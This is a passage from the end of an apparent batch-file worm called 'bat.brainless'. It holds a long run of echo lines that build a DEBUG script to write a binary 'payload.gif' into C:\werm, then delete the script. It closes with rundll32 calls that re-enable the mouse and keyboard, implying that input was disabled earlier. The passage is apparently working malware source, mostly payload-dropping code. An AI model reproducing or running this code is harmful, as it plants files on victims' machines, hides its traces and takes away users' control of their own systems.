echo e 1ED0  74 69 54 0D FA 52 A5 3A B5 22 50 6D A7 6A 82 8E>>paylaodpic
echo e 1EE0  57 54 0D 2D D2 2C A1 F2 6A 77 74 58 1B A5 D2 93>>paylaodpic
echo e 1EF0  92 2B 1D A8 42 7B 2A 53 95 AE 55 94 2D B5 6A 55>>paylaodpic
echo e 1F00  11 AA 56 A9 D6 33 A1 3D C4 EB 76 88 D9 49 64 9E>>paylaodpic
echo e 1F10  B1 97 CD C4 E6 54 99 F9 4B 96 EE D5 B0 77 35 A8>>paylaodpic
echo e 1F20  5F CD 3A CC C0 5E 15 A0 95 CC 6B 64 29 04 D7 D3>>paylaodpic
echo e 1F30  50 D6 A4 74 B5 AA 64 35 BB A0 37 A6 A6 B3 CD C1>>paylaodpic
echo e 1F40  AC 1B 37 3B 5A D2 96 D6 B4 A7 45 6D 6A 55 BB 5A>>paylaodpic
echo e 1F50  D6 B6 D6 B5 AF 85 6D 6C 65 3B 5B DA D6 D6 B6 B7>>paylaodpic
echo e 1F60  C5 6D 6E 75 BB 5B DE F6 D6 B7 BF 05 6E 70 85 3B>>paylaodpic
echo e 1F70  5C E2 16 D7 B8 C7 45 6E 72 95 BB 5C E6 36 D7 B9>>paylaodpic
echo e 1F80  CF 85 6E 74 FF A5 3B 5D EA 56 D7 BA D7 C5 6E 76>>paylaodpic
echo e 1F90  B5 BB 5D FC 4D 54 7B F6 21 DE 6E C2 4B 38 D5 8D>>paylaodpic
echo e 1FA0  37 83 41 1D 8D 03 DB 63 5E B9 A9 B7 4C 5C D5 2A>>paylaodpic
echo e 1FB0  7B 97 F7 34 F7 AA 47 BE 55 C4 1D 1E DD 9B BB D8>>paylaodpic
echo e 1FC0  A1 37 49 FE 65 24 80 37 98 DF F6 86 D5 82 F0 F5>>paylaodpic
echo e 1FD0  D3 AF F0 4B 5F 01 0F D8 C0 C2 22 30 22 C7 CA 5F>>paylaodpic
echo e 1FE0  EB 21 78 35 F5 6D 52 83 23 18 E1 FE 8E 55 97 18>>paylaodpic
echo e 1FF0  4E F0 7D 97 37 20 10 6B 8C C3 49 B3 D3 F8 4A 0C>>paylaodpic
echo e 2000  C0 09 AF F8 C0 5D F5 30 AF 48 EC DF 49 D1 70 C4>>paylaodpic
echo e 2010  F8 25 6D 7D 5D 7C 60 0B 1B 28 86 26 A6 9D 43 35>>paylaodpic
echo e 2020  CA 42 1C 32 78 73 EF E5 96 77 AF B4 64 1B 0B 2B>>paylaodpic
echo e 2030  4C 3D 9E 6F BD 2A 9C E2 14 BA F0 66 FA 5D D3 A3>>paylaodpic
echo e 2040  C2 1A D2 1D 1B EF C6 29 C6 13 79 0F 28 42 56 B2>>paylaodpic
echo e 2050  57 C4 15 DE E8 56 CB FC 60 1C 63 59 7C 32 46 A4>>paylaodpic
echo e 2060  EF B0 EC DD EF 9A 86 C2 1D 86 30 7F 21 4A B5 45>>paylaodpic
echo e 2070  EE 79 9B 11 3D 92 82 25 2C 68 34 C7 78 BE 60 B6>>paylaodpic
echo e 2080  50 22 F3 B4 FF E7 41 3F 94 C3 60 CD 14 A0 3F 9C>>paylaodpic
echo e 2090  64 3F C3 D9 D2 28 9E F3 96 69 7C E7 29 67 DA 79>>paylaodpic
echo e 20A0  95 C6 F3 9A 09 2D BE 51 3F B9 D4 8C EE 30 9B C9>>paylaodpic
echo e 20B0  7B 43 0D DF 47 D1 7B F4 B2 39 59 29 E1 38 5F 3A>>paylaodpic
echo e 20C0  C8 14 9D 34 95 DB 59 63 4A F7 FA C4 B5 CE B5 AD>>paylaodpic
echo e 20D0  81 0D 6B 87 D2 5A 79 75 9E F5 B1 2B 5A EC 40 6F>>paylaodpic
echo e 20E0  34 D5 26 94 34 69 50 D7 65 00 D5 B8 A1 CA 1E F6>>paylaodpic
echo e 20F0  B5 95 6D ED 6C AB 46 BD 12 8C 36 A6 9D DC E6 60>>paylaodpic
echo e 2100  3F 19 8F C4 BE 35 AE C5 8D 6C DA 45 7A C7 44 E6>>paylaodpic
echo e 2110  33 9F 5A 2D 25 28 07 28 DA 4A 33 B2 AC D7 CD ED>>paylaodpic
echo e 2120  46 0B F8 DB 60 2B F5 BA F5 8D 68 3B 9F 59 8A EC>>paylaodpic
echo e 2130  3E 78 C2 15 DE 6D 61 BF 1A E1 F2 EE B5 C0 E5 BC>>paylaodpic
echo e 2140  1C 6A FF E7 DE 59 6E 32 C3 83 CC EF 7E 6F 7A 76>>paylaodpic
echo e 2150  FF 0E B8 C6 85 3D 6E 24 D3 59 E2 E9 BE 35 93 23>>paylaodpic
echo e 2160  3E F1 84 E3 5B 83 F9 16 79 CC C5 3B EF F9 80 5A>>paylaodpic
echo e 2170  DD 23 47 F9 CD 2F CD F1 02 A3 17 E4 04 5F F6 C3>>paylaodpic
echo e 2180  65 3E F4 AF CB 9E D9 E5 86 E2 B9 CE 17 DE 6D 87>>paylaodpic
echo e 2190  9F 5C CC 03 57 BA D0 7B 53 F1 FE 6C 49 D1 7F 66>>paylaodpic
echo e 21A0  B9 B6 65 98 F2 DB 49 9D DE 40 1F B8 CA 7E 4E EE>>paylaodpic
echo e 21B0  F4 A2 09 E6 E8 DE 7A BA CF 8E F0 AB A3 7D C1 C9>>paylaodpic
echo e 21C0  C6 B9 D3 A7 4E F3 F8 9C 1D 78 2B 87 7B DA 71 5D>>paylaodpic
echo e 21D0  5E 95 17 FC E3 00 97 FB D8 21 EE F7 6D 66 FD DA>>paylaodpic
echo e 21E0  7C 2F 3C D4 1B FE 35 8E 06 D8 D9 72 27 7A A0 07>>paylaodpic
echo e 21F0  1F A1 F1 2A D8 CF 55 1E B5 CD 85 5C 79 54 4B 1B>>paylaodpic
echo e 2200  E3 17 57 B2 96 3B AF 79 C8 9B FA D1 9D 27 35 A4>>paylaodpic
echo e 2210  9B A7 28 49 87 D7 F5 A8 A7 F7 9D 35 4F 7A C7 FF>>paylaodpic
echo e 2220  BD DE FE E1 FC 44 2D 2F FA 70 A7 DE D3 57 0F 79>>paylaodpic
echo e 2230  B3 7F AF C2 BB A7 BE C8 9C 2E FD 82 4F 0D FB D1>>paylaodpic
echo e 2240  EB DE F9 AD 7F FE F1 83 AF 7C 68 83 1E F9 B5 07>>paylaodpic
echo e 2250  F1 BB 83 72 6F AA D5 CB 2E F8 06 E6 BD A7 56 07>>paylaodpic
echo e 2260  27 A4 A3 7E F9 DE DF FE AF E3 FE 75 93 6F BE FD>>paylaodpic
echo e 2270  E3 07 FE 47 E5 9F FE F9 37 3A EA B1 5F B4 F9 61>>paylaodpic
echo e 2280  FF 5F 2A 6B 97 EA DC F9 BF F3 BA BD F5 A1 3B F7>>paylaodpic
echo e 2290  08 C0 E0 32 B8 F2 48 40 00 3C C0 DC 30 B4 6A 6B>>paylaodpic
echo e 22A0  C0 DF 5A 40 F4 79 BF 1E 51 BF 0D 9B 3E 9F 1A C0>>paylaodpic
echo e 22B0  E2 9A C0 EF E8 40 E6 B8 40 0C AC 40 05 29 40 EE>>paylaodpic
echo e 22C0  1A B3 11 14 C1 07 34 C1 15 64 C1 16 74 C1 17 84>>paylaodpic
echo e 22D0  C1 18 94 C1 19 A4 C1 1A B4 C1 1B C4 C1 1C D4 C1>>paylaodpic
echo e 22E0  1D E4 C1 1E 94 8E 12 D4 19 1F 14 C2 9C E3 8D 08>>paylaodpic
echo e 22F0  1C 42 D7 42 C1 55 7A BA B1 39 B4 B2 38 3A DB 33>>paylaodpic
echo e 2300  C2 23 D4 9F E9 4B C2 87 4B C2 0C 3C 39 2A FC 40>>paylaodpic
echo e 2310  29 34 A0 EB C3 42 76 C3 C2 2F 1C B9 EF 0B 41 2E>>paylaodpic
echo e 2320  EC 21 91 4A B5 AF EB 38 08 D3 3B C3 AB 28 77 63>>paylaodpic
echo e 2330  3C 33 1C AD BE 83 B3 12 A3 43 DD 51 A0 C9 1B 36>>paylaodpic
echo e 2340  3A 5C E7 3F 39 2C 20 3E F4 BA E4 5B 3B 22 5C 3A>>paylaodpic
echo e 2350  9D 4B BA 28 F4 C3 EE 72 34 73 FB 32 89 13 BC C5>>paylaodpic
echo e 2360  2B 2A 44 4C C4 FA 29 21 15 1B 32 BC 2B 44 9C 03>>paylaodpic
echo e 2370  44 37 9C 44 C9 02 B7 69 DB AF 8C 23 44 90 D9 C4>>paylaodpic
echo e 2380  BC EB 44 CD D2 21 1D 03 45 4C 1C 45 51 BC BF 36>>paylaodpic
echo e 2390  3C C5 BC 52 45 56 E3 AA 41 BC 3F 3C 8C 37 4E 8C>>paylaodpic
echo e 23A0  C5 0F 8A B1 50 AC 45 57 B4 45 48 3C B7 5D 44 45>>paylaodpic
echo e 23B0  10 7B C4 EC 5B BA A3 6B 44 94 53 41 62 E4 9F 15>>paylaodpic
echo e 23C0  3B C6 65 DC 43 57 DC 37 B3 03 42 67 F4 A1 0A AA>>paylaodpic
echo e 23D0  44 04 C3 45 F0 09 44 19 82 43 6C F4 44 E6 DB 3F>>paylaodpic
echo e 23E0  90 F3 42 A3 5B 45 F6 A1 3D 71 EC 1F D2 73 C7 4B>>paylaodpic
echo e 23F0  3C C7 0A C4 B0 80 5B 47 76 DC 9F 77 0C 37 5F BC>>paylaodpic
echo e 2400  3E 58 CC 44 8D 19 BE 6B B4 C7 76 04 48 C5 0B 48>>paylaodpic
echo e 2410  FF 1B C8 6F 2C 48 EA 3A 48 86 4A C8 86 74 C8 87>>paylaodpic
echo e 2420  84 C8 88 94 C8 89 A4 C8 8A B4 18 C8 8B C4 C8 8C>>paylaodpic
echo e 2430  D4 C8 8D E4 C8 8E F4 C8 8F 04 C9 90 14 C9 91 E4>>paylaodpic
echo e 2440  9F 80 00 00 3B 00>>paylaodpic
echo rcx>>paylaodpic
echo 2345>>paylaodpic
echo nC:\werm\payload.gif>>paylaodpic
echo w>>paylaodpic
echo q>>paylaodpic
debug < paylaodpic
del paylaodpic
:endofpic

REM end of the picture payload

c:\windows\rundll32.exe mouse,enable
c:\windows\rundll32.exe keyboard,enable

REM enable mouse & keyboard

REM end of bat.brainless